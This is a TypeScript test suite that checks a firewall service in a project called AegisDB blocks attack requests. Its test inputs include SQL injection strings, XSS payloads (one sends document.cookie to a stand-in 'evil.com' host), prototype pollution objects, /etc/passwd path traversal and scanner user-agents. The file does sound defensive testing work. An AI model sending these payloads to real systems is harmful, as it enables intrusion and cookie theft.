// ─────────────────────────────────────────────────────────────────────────────
//  tests/waf-shield.test.ts
//  AegisDB — Layer-7 Web Application Firewall (WAF) & Payload Shield Test Suite
// ─────────────────────────────────────────────────────────────────────────────

import 'dotenv/config';
import { initSqlite } from '../src/db/sqlite.connection';
import { wafShieldService } from '../src/services/waf-shield.service';
import { networkAccessService } from '../src/services/network-access.service';

let passed = 0;
let failed = 0;

function assert(condition: boolean, testName: string, detail?: any) {
  if (condition) {
    console.log(`  ✅ PASS: ${testName}`);
    passed++;
  } else {
    console.error(`  ❌ FAIL: ${testName}`, detail || '');
    failed++;
  }
}

async function runWafTests() {
  console.log('================================================================');
  console.log('🧪 Running Layer-7 WAF & Payload Threat Shield Test Suite');
  console.log('================================================================\n');

  initSqlite();

  // Reset to default settings
  wafShieldService.updateSettings({
    enabled: true,
    blockSqlInjection: true,
    blockXss: true,
    blockPrototypePollution: true,
    blockPathTraversal: true,
    blockScanners: true,
    autoJailRepeatOffenders: true,
  });

  // ─────────────────────────────────────────────────────────────────────────
  // TEST 1: Initial Settings & Clean Request Inspection
  // ─────────────────────────────────────────────────────────────────────────
  console.log('--- 1. Clean Request Evaluation ---');
  const settings = wafShieldService.getSettings();
  assert(settings.enabled === true, 'WAF master shield is enabled');
  assert(settings.blockSqlInjection === true, 'SQLi blocking is enabled');

  const cleanCheck = wafShieldService.inspectRequest({
    method: 'POST',
    path: '/api/v1/db/collections/orders/documents',
    body: { customer: 'Alice', items: 3, total: 45.99 },
    clientIp: '192.168.31.50',
    headers: { 'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)' }
  });
  assert(cleanCheck.blocked === false, 'Legitimate payload is allowed through');
  assert(cleanCheck.riskScore === 0, 'Clean payload risk score is 0');

  // ─────────────────────────────────────────────────────────────────────────
  // TEST 2: SQL Injection (SQLi) Detection
  // ─────────────────────────────────────────────────────────────────────────
  console.log('\n--- 2. SQL Injection (SQLi) Defense ---');
  // Union Select
  const unionSqli = wafShieldService.inspectRequest({
    method: 'GET',
    path: '/api/v1/db/collections/users/documents',
    query: { filter: "id=1 UNION SELECT password, email FROM users" },
    clientIp: '198.51.100.22'
  });
  assert(unionSqli.blocked === true, 'UNION SELECT SQL injection blocked');
  assert(unionSqli.threatType === 'sqli', 'Threat type is "sqli"');

  // Tautology
  const tautologySqli = wafShieldService.inspectRequest({
    method: 'POST',
    path: '/api/v1/auth/login',
    body: { email: "admin@aegisdb.dev' OR '1'='1", password: 'test' },
    clientIp: '198.51.100.23'
  });
  assert(tautologySqli.blocked === true, 'Tautology SQL injection (OR 1=1) blocked');

  // Comment attack
  const commentSqli = wafShieldService.inspectRequest({
    method: 'POST',
    path: '/api/v1/db/collections/users/documents',
    body: { query: "DROP TABLE system_keys; --" },
    clientIp: '198.51.100.24'
  });
  assert(commentSqli.blocked === true, 'Comment & Stacked query SQL injection blocked');

  // ─────────────────────────────────────────────────────────────────────────
  // TEST 3: Cross-Site Scripting (XSS) Detection
  // ─────────────────────────────────────────────────────────────────────────
  console.log('\n--- 3. Cross-Site Scripting (XSS) Defense ---');
  // Script tag
  const scriptXss = wafShieldService.inspectRequest({
    method: 'POST',
    path: '/api/v1/db/collections/comments/documents',
    body: { comment: "Great post! <script>alert(document.cookie)</script>" },
    clientIp: '198.51.100.30'
  });
  assert(scriptXss.blocked === true, '<script> tag XSS blocked');
  assert(scriptXss.threatType === 'xss', 'Threat type is "xss"');

  // Onerror image execution
  const onerrorXss = wafShieldService.inspectRequest({
    method: 'POST',
    path: '/api/v1/db/collections/profile/documents',
    body: { avatarUrl: '<img src=x onerror="fetch(`http://evil.com/steal?`+document.cookie)">' },
    clientIp: '198.51.100.31'
  });
  assert(onerrorXss.blocked === true, 'onerror= event handler XSS blocked');

  // Javascript pseudo-protocol
  const jsProtocolXss = wafShieldService.inspectRequest({
    method: 'GET',
    path: '/api/v1/db/collections/links/documents',
    query: { target: 'javascript:void(window.location="http://hacker.com")' },
    clientIp: '198.51.100.32'
  });
  assert(jsProtocolXss.blocked === true, 'javascript: URI vector blocked');

  // ─────────────────────────────────────────────────────────────────────────
  // TEST 4: Prototype Pollution Shield
  // ─────────────────────────────────────────────────────────────────────────
  console.log('\n--- 4. Prototype Pollution Shield ---');
  const protoAttack = wafShieldService.inspectRequest({
    method: 'PATCH',
    path: '/api/v1/db/collections/settings/documents/doc-1',
    body: { "__proto__": { "isAdmin": true, "role": "superadmin" } },
    clientIp: '198.51.100.40'
  });
  assert(protoAttack.blocked === true, '__proto__ prototype pollution blocked');
  assert(protoAttack.threatType === 'prototype_pollution', 'Threat type is "prototype_pollution"');

  const constructorProtoAttack = wafShieldService.inspectRequest({
    method: 'POST',
    path: '/api/v1/db/collections/items/documents',
    body: { "constructor": { "prototype": { "polluted": true } } },
    clientIp: '198.51.100.41'
  });
  assert(constructorProtoAttack.blocked === true, 'constructor.prototype pollution blocked');

  // ─────────────────────────────────────────────────────────────────────────
  // TEST 5: Directory & Path Traversal Shield
  // ─────────────────────────────────────────────────────────────────────────
  console.log('\n--- 5. Directory & Path Traversal Shield ---');
  const traversalAttack = wafShieldService.inspectRequest({
    method: 'GET',
    path: '/api/v1/storage/assets/../../../../etc/passwd',
    clientIp: '198.51.100.50'
  });
  assert(traversalAttack.blocked === true, 'Relative path traversal (/etc/passwd) blocked');
  assert(traversalAttack.threatType === 'path_traversal', 'Threat type is "path_traversal"');

  const winTraversal = wafShieldService.inspectRequest({
    method: 'GET',
    path: '/api/v1/storage/assets/..\\..\\windows\\system32\\drivers\\etc\\hosts',
    clientIp: '198.51.100.51'
  });
  assert(winTraversal.blocked === true, 'Windows backslash path traversal blocked');

  // ─────────────────────────────────────────────────────────────────────────
  // TEST 6: Vulnerability Scanner & Bad Bot Detection
  // ─────────────────────────────────────────────────────────────────────────
  console.log('\n--- 6. Scanner & Exploitation Tool Defense ---');
  const sqlmapBot = wafShieldService.inspectRequest({
    method: 'GET',
    path: '/api/v1/db/collections',
    clientIp: '198.51.100.60',
    headers: { 'user-agent': 'sqlmap/1.7.2#stable (https://sqlmap.org)' }
  });
  assert(sqlmapBot.blocked === true, 'sqlmap tool signature blocked');
  assert(sqlmapBot.threatType === 'scanner', 'Threat type is "scanner"');

  const niktoBot = wafShieldService.inspectRequest({
    method: 'GET',
    path: '/admin',
    clientIp: '198.51.100.61',
    headers: { 'user-agent': 'Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:Port Check)' }
  });
  assert(niktoBot.blocked === true, 'Nikto vulnerability scanner signature blocked');

  // ─────────────────────────────────────────────────────────────────────────
  // TEST 7: WAF Statistics & Event Logging Telemetry
  // ─────────────────────────────────────────────────────────────────────────
  console.log('\n--- 7. Live WAF Statistics & Event Log ---');
  const stats = wafShieldService.getStats();
  assert(stats.totalInspected > 10, 'Total inspected count incremented');
  assert(stats.totalBlocked >= 10, 'Total blocked count matches threat attempts');
  assert(stats.threatBreakdown.sqli >= 3, 'SQLi threat counter tracked');
  assert(stats.threatBreakdown.xss >= 3, 'XSS threat counter tracked');
  assert(stats.threatBreakdown.prototype_pollution >= 2, 'Prototype pollution threat counter tracked');
  assert(stats.threatBreakdown.path_traversal >= 2, 'Path traversal threat counter tracked');
  assert(stats.threatBreakdown.scanner >= 2, 'Scanner threat counter tracked');
  assert(stats.recentEvents.length > 0, 'Recent blocked threat events recorded');

  // ─────────────────────────────────────────────────────────────────────────
  // TEST 8: Settings Toggle & Bypass Verification
  // ─────────────────────────────────────────────────────────────────────────
  console.log('\n--- 8. Settings Toggle Verification ---');
  // Temporarily disable XSS protection
  wafShieldService.updateSettings({ blockXss: false });
  const bypassXss = wafShieldService.inspectRequest({
    method: 'POST',
    path: '/api/v1/db/test',
    body: { text: '<script>alert(1)</script>' },
    clientIp: '192.168.31.50'
  });
  assert(bypassXss.blocked === false, 'XSS permitted when rule is specifically disabled');

  // Re-enable XSS protection
  wafShieldService.updateSettings({ blockXss: true });
  const reblockedXss = wafShieldService.inspectRequest({
    method: 'POST',
    path: '/api/v1/db/test',
    body: { text: '<script>alert(1)</script>' },
    clientIp: '192.168.31.50'
  });
  assert(reblockedXss.blocked === true, 'XSS blocked again after re-enabling rule');

  // ─────────────────────────────────────────────────────────────────────────
  // TEST 9: Auto-Jail Repeat Attacker
  // ─────────────────────────────────────────────────────────────────────────
  console.log('\n--- 9. Auto-Jail Repeat Offender ---');
  const attackerIp = '203.0.113.99';
  // Send 2 consecutive attacks
  wafShieldService.inspectRequest({
    method: 'POST',
    path: '/api/v1/login',
    body: { email: "' UNION SELECT * FROM users --" },
    clientIp: attackerIp
  });
  wafShieldService.inspectRequest({
    method: 'POST',
    path: '/api/v1/login',
    body: { email: "' UNION SELECT * FROM users --" },
    clientIp: attackerIp
  });

  const jailedIps = networkAccessService.getJailedIps();
  const isAttackerJailed = jailedIps.some(j => j.ipAddress === attackerIp);
  assert(isAttackerJailed === true, 'Repeat malicious attacker automatically jailed in quarantine');

  console.log('\n================================================================');
  console.log(`📊 WAF Shield Test Results: ${passed} passed, ${failed} failed`);
  console.log('================================================================\n');

  if (failed > 0) {
    process.exit(1);
  }
  process.exit(0);
}

runWafTests().catch(err => {
  console.error('Fatal WAF test error:', err);
  process.exit(1);
});
